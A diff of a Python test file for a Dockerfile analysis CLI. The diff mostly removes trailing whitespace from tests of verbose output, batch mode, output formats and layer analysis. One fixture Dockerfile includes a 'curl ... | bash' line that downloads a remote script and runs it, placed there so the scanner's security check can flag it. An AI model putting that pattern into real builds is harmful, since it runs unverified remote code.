@@ -1070,17 +1070,17 @@ CMD ["python", "app.py"]
         """Test CLI exception handling with verbose traceback output."""
         # Create a scenario that might cause an exception during processing
         dockerfile_content = "FROM nonexistent:invalid\nRUN invalid-command"
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f:
             f.write(dockerfile_content)
             dockerfile_path = f.name
-        
+
         try:
             result = self.runner.invoke(main, [
                 '--dockerfile', dockerfile_path,
                 '--verbose'
             ])
-            
+
             # Should handle gracefully and show traceback in verbose mode
             assert result.exit_code in [0, 1]
             # In verbose mode, should either succeed or show detailed error
@@ -1096,7 +1096,7 @@ CMD ["python", "app.py"]
             '--batch', '/nonexistent/Dockerfile2',
             '--performance'
         ])
-        
+
         # Should handle empty batch processing gracefully
         assert result.exit_code == 1
         assert "No valid Dockerfiles found" in result.output
@@ -1108,18 +1108,18 @@ FROM alpine:3.18
 RUN apk add --no-cache python3
 USER root
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f:
             f.write(dockerfile_content)
             dockerfile_path = f.name
-        
+
         try:
             result = self.runner.invoke(main, [
                 '--dockerfile', dockerfile_path,
                 '--analysis-only',
                 '--format', 'yaml'
             ])
-            
+
             assert result.exit_code == 0
             # YAML output should contain structured data
             assert "base_image:" in result.output
@@ -1134,18 +1134,18 @@ FROM ubuntu:20.04
 USER root
 RUN apt-get update
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f:
             f.write(dockerfile_content)
             dockerfile_path = f.name
-        
+
         try:
             result = self.runner.invoke(main, [
                 '--dockerfile', dockerfile_path,
                 '--analysis-only',
                 '--format', 'json'
             ])
-            
+
             assert result.exit_code == 0
             # Should be valid JSON
             output_data = json.loads(result.output)
@@ -1162,18 +1162,18 @@ USER root
 RUN apt-get update
 RUN curl http://insecure-url.com/script.sh | bash
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f:
             f.write(dockerfile_content)
             dockerfile_path = f.name
-        
+
         try:
             result = self.runner.invoke(main, [
                 '--dockerfile', dockerfile_path,
                 '--analysis-only',
                 '--verbose'
             ])
-            
+
             assert result.exit_code == 0
             assert "Security Issues Found" in result.output
             # Verbose mode should show more details
@@ -1190,17 +1190,17 @@ RUN apt-get install -y curl
 RUN apt-get install -y wget
 RUN apt-get clean
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f:
             f.write(dockerfile_content)
             dockerfile_path = f.name
-        
+
         try:
             result = self.runner.invoke(main, [
                 '--dockerfile', dockerfile_path,
                 '--verbose'
             ])
-            
+
             assert result.exit_code == 0
             assert "Layer Optimizations" in result.output
             # Verbose mode should show optimization reasoning
@@ -1212,25 +1212,25 @@ RUN apt-get clean
         """Test CLI batch processing with output file generation."""
         dockerfile1_content = "FROM alpine:3.18\nRUN apk add curl"
         dockerfile2_content = "FROM ubuntu:20.04\nRUN apt-get update"
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f1:
             f1.write(dockerfile1_content)
             dockerfile1_path = f1.name
-            
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f2:
             f2.write(dockerfile2_content)
             dockerfile2_path = f2.name
-            
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.output', delete=False) as out:
             output_path = out.name
-        
+
         try:
             result = self.runner.invoke(main, [
                 '--batch', dockerfile1_path,
                 '--batch', dockerfile2_path,
                 '--output', output_path
             ])
-            
+
             assert result.exit_code == 0
             # Should process multiple files
             assert dockerfile1_path in result.output
@@ -1243,17 +1243,17 @@ RUN apt-get clean
     def test_cli_invalid_format_option(self):
         """Test CLI with invalid format option."""
         dockerfile_content = "FROM alpine:3.18\nRUN apk add curl"
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f:
             f.write(dockerfile_content)
             dockerfile_path = f.name
-        
+
         try:
             result = self.runner.invoke(main, [
                 '--dockerfile', dockerfile_path,
                 '--format', 'invalid'
             ])
-            
+
             # Should handle invalid format option
             assert result.exit_code == 2  # Click validation error
         finally:
@@ -1269,18 +1269,18 @@ COPY app.py /app/
 WORKDIR /app
 CMD ["python", "app.py"]
 """
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f:
             f.write(dockerfile_content)
             dockerfile_path = f.name
-        
+
         try:
             result = self.runner.invoke(main, [
                 '--dockerfile', dockerfile_path,
                 '--layer-analysis',
                 '--verbose'
             ])
-            
+
             assert result.exit_code == 0
             assert "Layer Breakdown" in result.output
             # Verbose mode should show individual layer details
@@ -1289,12 +1289,12 @@ CMD ["python", "app.py"]
             Path(dockerfile_path).unlink()
 
     def test_cli_analyze_image_with_verbose_details(self):
-        """Test CLI image analysis with verbose details.""" 
+        """Test CLI image analysis with verbose details."""
         result = self.runner.invoke(main, [
             '--analyze-image', 'alpine:3.18',
             '--verbose'
         ])
-        
+
         # May succeed or fail depending on Docker availability
         assert result.exit_code in [0, 1, 2]  # Allow Click validation errors too
         if result.exit_code == 0:
